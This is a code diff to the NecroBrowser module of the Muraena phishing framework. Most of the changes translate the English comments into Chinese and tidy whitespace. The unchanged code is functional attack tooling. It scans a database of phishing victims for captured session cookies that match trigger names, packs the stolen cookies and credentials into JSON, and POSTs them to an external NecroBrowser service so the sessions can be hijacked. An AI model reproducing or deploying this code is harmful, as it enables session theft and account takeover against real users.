@@ -25,7 +25,7 @@ const (
 	Author = "Muraena Team"
 
 	// Placeholders for templates
-	TrackerPlaceholder = "%%%TRACKER%%%"
+	TrackerPlaceholder     = "%%%TRACKER%%%"
 	CookiePlaceholder      = "%%%COOKIES%%%"
 	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
 )
@@ -60,27 +60,26 @@ type VictimCredentials struct {
 	Time  time.Time
 }
 
-// Name returns the module name
+// Name 返回模块名
 func (module *Necrobrowser) Name() string {
 	return Name
 }
 
-// Description returns the module description
+// Description 返回模块描述
 func (module *Necrobrowser) Description() string {
 	return Description
 }
 
-// Author returns the module author
+// Author 返回模块作者
 func (module *Necrobrowser) Author() string {
 	return Author
 }
 
-// Prompt prints module status based on the provided parameters
+// Prompt 根据提供的参数打印模块状态
 func (module *Necrobrowser) Prompt() {
 	module.Raw("No options are available for this module")
 }
 
-// Load configures the module by initializing its main structure and variables
 func Load(s *session.Session) (m *Necrobrowser, err error) {
 
 	m = &Necrobrowser{
@@ -103,11 +102,10 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 		m.Enabled = false
 		return
 	}
-
+	// m.Request 为读取 config.Profile 的内容
 	m.Request = string(bytes)
 
-	// spawn a go routine that checks all the victims cookie jars every N seconds
-	// to see if we have any sessions ready to be instrumented
+	// go 例程，每隔 N 秒检查所有受害者的 cookie jar，以查看是否有任何会话准备好进行检测
 	if s.Config.NecroBrowser.Enabled {
 		go m.CheckSessions()
 	}
@@ -137,14 +135,14 @@ func (module *Necrobrowser) CheckSessions() {
 
 func (module *Necrobrowser) CheckSessionCookies() {
 	triggerValues := module.Session.Config.NecroBrowser.Trigger.Values
-
+	// 获取被攻击的浏览器（victim）信息
 	victims, err := db.GetAllVictims()
 	if err != nil {
 		module.Debug("error fetching all victims: %s", err)
 	}
 
 	// module.Debug("checkSessions: we have %d victim sessions. Checking authenticated ones.. ", len(victims))
-
+	// 查看 cookie 名称是否在 triggerValues 中
 	for _, v := range victims {
 		cookiesFound := 0
 		cookiesNeeded := len(triggerValues)
@@ -153,11 +151,10 @@ func (module *Necrobrowser) CheckSessionCookies() {
 				cookiesFound++
 			}
 		}
-
-		// if we find the cookies, and the session has not been already instrumented (== false), then instrument
+		// triggerValues 在 cookie 中都被找到，且 v.SessionInstrumented 未被检测
 		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
-			module.Instrument(v.ID, v.Cookies, "[]") // TODO add credentials JSON, instead of passing empty [] array
-			// prevent the session to be instrumented twice
+			module.Instrument(v.ID, v.Cookies, "[]") // 添加凭据
+			// 防止 session 被检测两次
 			_ = db.SetSessionAsInstrumented(v.ID)
 		}
 	}
@@ -172,17 +169,13 @@ func Contains(slice *[]string, find string) bool {
 	return false
 }
 
-
-
-
-
 func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCookie, credentialsJSON string) {
 
 	var necroCookies []SessionCookie
 	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
 
 	for _, c := range cookieJar {
-
+		// t = 过期时间
 		module.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
 		t, err := time.Parse(timeLayout, c.Expires)
 		if err != nil {
@@ -203,20 +196,20 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 
 		necroCookies = append(necroCookies, nc)
 	}
-
+	// 将 necroCookies 转为 json 字符串
 	c, err := json.MarshalIndent(necroCookies, "", "\t")
 	if err != nil {
 		module.Warning("Error marshalling the cookies: %s", err)
 		return
 	}
-
+	// 将 request 请求中的 cookie、credentials 等填充
 	cookiesJSON := string(c)
 	module.Request = strings.ReplaceAll(module.Request, TrackerPlaceholder, victimID)
 	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
 	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
 
 	module.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)
-
+	// 发送 request 请求
 	client := resty.New()
 	resp, err := client.R().
 		SetHeader("Content-Type", "application/json").
@@ -230,6 +223,3 @@ func (module *Necrobrowser) Instrument(victimID string, cookieJar []db.VictimCoo
 	module.Info("NecroBrowser Response: %+v", resp)
 	return
 }
-
-
-
